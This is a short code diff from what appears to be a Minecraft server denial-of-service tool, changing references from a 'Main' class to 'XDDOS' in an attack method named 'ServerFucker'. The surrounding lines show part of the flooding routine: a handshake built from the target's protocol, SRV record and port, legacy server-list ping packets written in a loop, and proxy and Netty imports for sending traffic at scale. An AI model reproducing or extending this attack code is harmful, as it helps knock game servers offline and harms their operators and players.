@@ -1,6 +1,6 @@
 package XD.XDDOS.methods;
 
-import XD.XDDOS.Main;
+import XD.XDDOS.XDDOS;
 import XD.XDDOS.NettyBootstrap;
 import XD.XDDOS.ProxyLoader;
 import XD.XDDOS.utils.Handshake;
@@ -13,7 +13,7 @@ import java.io.IOException;
 import java.security.SecureRandom;
 
 public class ServerFucker implements Method {
-  private Handshake handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
+  private Handshake handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);
   
   public static byte[] addAll(byte[] array1, byte... array2) {
     byte[] joinedArray = new byte[array1.length + array2.length];
@@ -40,7 +40,7 @@ public class ServerFucker implements Method {
         out.write(254);
         out.write(47);
         out.writeUTF("MC | PINGHOST");
-        out.writeBytes(Main.srvRecord);
+        out.writeBytes(XDDOS.srvRecord);
         out.write(0);
         out.write(1);
         out.write(254);
